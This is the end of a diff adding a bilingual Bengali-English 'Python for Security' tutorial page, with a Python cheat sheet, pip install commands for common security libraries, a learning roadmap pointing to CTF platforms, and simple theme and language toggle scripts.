+        <div class="cheat-row"><span class="cheat-cmd">r.text</span><span class="cheat-desc"><span class="bn-text">Response body</span><span class="en-text">Response body</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">r.headers</span><span class="cheat-desc"><span class="bn-text">Response headers</span><span class="en-text">Response headers</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">r.json()</span><span class="cheat-desc">JSON parse</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">requests.Session()</span><span class="cheat-desc"><span class="bn-text">cookie session</span><span class="en-text">Cookie session</span></span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#27ae60;">subprocess / os</div>
+        <div class="cheat-row"><span class="cheat-cmd">subprocess.getoutput(cmd)</span><span class="cheat-desc"><span class="bn-text">cmd output পাওয়া</span><span class="en-text">Get cmd output</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">subprocess.run([...])</span><span class="cheat-desc"><span class="bn-text">cmd চালানো</span><span class="en-text">Run command</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">os.path.exists(path)</span><span class="cheat-desc"><span class="bn-text">file আছে কি</span><span class="en-text">File exists?</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">os.listdir(path)</span><span class="cheat-desc"><span class="bn-text">dir contents</span><span class="en-text">Dir contents</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">os.getcwd()</span><span class="cheat-desc"><span class="bn-text">current dir</span><span class="en-text">Current dir</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">os.environ.get("VAR")</span><span class="cheat-desc"><span class="bn-text">env variable</span><span class="en-text">Env variable</span></span></div>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Quick Install Commands</span><span class="en-text">Quick Install Commands</span></h2>
+    <div class="code">
+<span class="c"># Security Libraries Install</span>
+<span class="p">$</span> pip3 install requests beautifulsoup4   <span class="c"># Web scraping</span>
+<span class="p">$</span> pip3 install scapy                      <span class="c"># Packet manipulation</span>
+<span class="p">$</span> pip3 install paramiko                   <span class="c"># SSH</span>
+<span class="p">$</span> pip3 install pwntools                   <span class="c"># CTF & exploit</span>
+<span class="p">$</span> pip3 install cryptography               <span class="c"># Encryption</span>
+<span class="p">$</span> pip3 install python-nmap                <span class="c"># Nmap wrapper</span>
+<span class="p">$</span> pip3 install impacket                   <span class="c"># Network protocols</span>
+<span class="p">$</span> pip3 install shodan                     <span class="c"># Shodan API</span>
+<span class="p">$</span> pip3 install dnspython                  <span class="c"># DNS operations</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">পরবর্তী কী শিখব?</span><span class="en-text">What to Learn Next?</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">ধাপ</span><span class="en-text">Step</span></th>
+        <th><span class="bn-text">বিষয়</span><span class="en-text">Topic</span></th>
+        <th><span class="bn-text">Resource</span><span class="en-text">Resource</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><span class="badge badge-g">1</span></td><td>OOP (Class, Object)</td><td>Python Docs, Real Python</td></tr>
+        <tr><td><span class="badge badge-b">2</span></td><td>CTF Challenges</td><td>PicoCTF, HackTheBox</td></tr>
+        <tr><td><span class="badge badge-b">3</span></td><td>Scapy Deep Dive</td><td>scapy.readthedocs.io</td></tr>
+        <tr><td><span class="badge badge-r">4</span></td><td>pwntools / pwn.college</td><td>pwn.college (free)</td></tr>
+        <tr><td><span class="badge badge-r">5</span></td><td>Impacket (AD attacks)</td><td>GitHub/impacket</td></tr>
+        <tr><td><span class="badge badge-p">6</span></td><td><span class="bn-text">নিজের Tool তৈরি করো</span><span class="en-text">Build your own tools</span></td><td>GitHub projects</td></tr>
+      </tbody>
+    </table>
+
+    <div style="text-align:center; margin-top:50px; padding:30px; background:var(--code-bg); border-radius:8px; border-top:3px solid var(--accent);">
+      <div style="font-family:'JetBrains Mono',monospace; font-size:17px; color:#e8dcc8; margin-bottom:10px;">
+        >>> <span style="color:#98c379;">"Code is Poetry. Secure Code is Art."</span>
+      </div>
+      <p style="color:rgba(200,180,150,0.55); font-size:13px; max-width:550px; margin:0 auto;">
+        <span class="bn-text">এই ডকুমেন্ট সম্পূর্ণ শিক্ষামূলক। সবসময় authorized environment-এ practice করো।</span>
+        <span class="en-text">This document is entirely educational. Always practice in an authorized environment.</span>
+      </p>
+      <p style="margin-top:10px; font-size:11px; color:rgba(192,57,43,0.6); font-family:'JetBrains Mono',monospace;">
+        v1.0 — Python for Security | Basics to Security Scripting | Bilingual | 12 Chapters
+      </p>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const body = document.body;
+body.classList.add('light-mode');
+
+function toggleTheme() {
+  const btn = document.getElementById('themeBtn');
+  if (body.classList.contains('light-mode')) {
+    body.classList.replace('light-mode', 'dark-mode');
+    btn.textContent = '☀️ Light';
+    localStorage.setItem('theme', 'dark');
+  } else {
+    body.classList.replace('dark-mode', 'light-mode');
+    btn.textContent = '🌙 Dark';
+    localStorage.setItem('theme', 'light');
+  }
+}
+
+function toggleLang() {
+  const btn = document.getElementById('langBtn');
+  if (body.classList.contains('lang-en')) {
+    body.classList.remove('lang-en');
+    btn.textContent = '🇬🇧 English';
+    localStorage.setItem('lang', 'bn');
+  } else {
+    body.classList.add('lang-en');
+    btn.textContent = '🇧🇩 বাংলা';
+    localStorage.setItem('lang', 'en');
+  }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+  const savedTheme = localStorage.getItem('theme');
+  const savedLang  = localStorage.getItem('lang');
+  if (savedTheme === 'dark') {
+    body.classList.replace('light-mode', 'dark-mode');
+    const btn = document.getElementById('themeBtn');
+    if (btn) btn.textContent = '☀️ Light';
+  }
+  if (savedLang === 'en') {
+    body.classList.add('lang-en');
+    const btn = document.getElementById('langBtn');
+    if (btn) btn.textContent = '🇧🇩 বাংলা';
+  }
+});
+</script>
+</body>
+</html>
